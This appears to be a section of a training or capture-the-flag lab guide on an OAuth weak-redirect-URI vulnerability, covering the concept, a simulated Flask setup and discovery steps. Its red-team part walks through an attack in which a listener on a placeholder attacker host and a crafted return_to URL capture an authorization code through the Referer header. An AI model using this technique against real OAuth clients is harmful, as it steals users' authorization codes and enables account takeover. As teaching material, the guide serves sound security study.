# 5. Vulnerability: OAuth Exploitation (Web - Weak Redirect URI)

## 5.1. Concept/Description

OAuth 2.0 is a framework enabling applications (Clients) to obtain limited access to user accounts on an HTTP service (
like a login provider or Identity Provider - IdP), without sharing the user's credentials. A common flow involves the
Client redirecting the user to the IdP for authentication. After authentication, the IdP redirects the user back to a
pre-registered redirect_uri on the Client, appending an authorization code. The Client then exchanges this code for an
access token. A weak redirect URI vulnerability occurs if the Client or IdP improperly validates the redirect_uri
parameter provided in the initial request. An attacker might craft a malicious redirect_uri (or include a parameter that
influences the final redirect) pointing to an attacker-controlled server. If the IdP redirects the user (with the code)
back to a compromised URI, or if the Client itself performs an unsafe redirect after receiving the code, the attacker
can steal the authorization code.

## 5.2 Setup

### Step#1: Install Python & Flask

```bash
  sudo apt update && sudo apt install python3 python3-pip && pip3 install Flask
```

### Step#2: Simulate Identity Provider Server

Use this on terminal #1

```bash
    python3 idp.py
```

### Step#3: Simulate Vulnerable Client Application

Use this on terminal #2

```bash
    python3 client_app.py
```

### Step#4: Ensure that there is no conflict and both applications are running

### Step#5 (Linux - Optional): Firewall Configuration

```bash
    sudo ufw allow 5000/tcp 
    sudo ufw allow 5001/tcp
```

## 5.3 Discovery (Read Team)

1. Observe Flow: Access the client app (http://<target_ip>:5000). Click the "Login with OAuth" link. Observe the browser
   being redirected to the IdP (:5001/auth) with a redirect_uri parameter containing http://<target_ip>:
   5000/callback....
2. Analyze Parameters: Notice the return_to parameter within the redirect_uri sent to the IdP, and also potentially
   present in the initial login link on the client app.
3. Hypothesize: Suspect that the return_to parameter might control the final redirection destination after
   authentication and that the authorization code might be leaked during this final redirect.

## 5.4 Manual Exploit (Red Team)

1. Setup Listener: Start a simple HTTP server on the attacker machine to capture the request (replace attacker_ip with
   your machine's IP accessible by the victim browser).

    ```bash
        python3 -m http.server 8000 --bind <attacker_ip>
        # Alternatively, use nc -lvp 8000.15 
    ```

2. Craft Malicious Link: Create the URL that the victim needs to click. This link targets the client app's login
   endpoint but includes the attacker's server in the return_to parameter.
   ```bash
        curl "http://<target_ip>:5000/login?return_to=http://<attacker_ip>:8000"
    ```
3. Simulate Victim Action: Open the crafted link in a browser.
4. Authentication Flow:
    - The browser hits
      `http://<target_ip>:5000/login?return_to=http://<attacker_ip>:8000.`
    - The client app redirects to the IdP
      `(http://<target_ip>:5001/auth?client_id=...&redirect_uri=http://<target_ip>:5000/callback?return_to=http://<attacker_ip>:8000).`
    - Click "Grant Access" on the simulated IdP page.
    - The IdP redirects back to the client app's callback:
      `http://<target_ip>:5000/callback?return_to=http://<attacker_ip>:8000&code=flag{n0t_s0_s3cur3_0auth_c0d3}`
    - Vulnerability Triggered: The client app's /callback function reads the return_to parameter (
      `http://<attacker_ip>:8000`) and immediately redirects the browser to that address.
5. Capture Code: Check the logs of the attacker's listener (`python3 -m http.server` or `nc`). The browser's request to
   `http://<attacker_ip>:8000` will contain the Referer header, which includes the full URL from which the redirect
   originated,
   including the authorization code.
    - Example log line from Python server: "GET / HTTP/1.1" 200 - Referer:
      `http://<target_ip>:5000/callback?return_to=http://<attacker_ip>:8000&code=flag{n0t_s0_s3cur3_0auth_c0d3}`
    - Extract the flag (flag{n0t_s0_s3cur3_0auth_c0d3}) from the Referer header. 
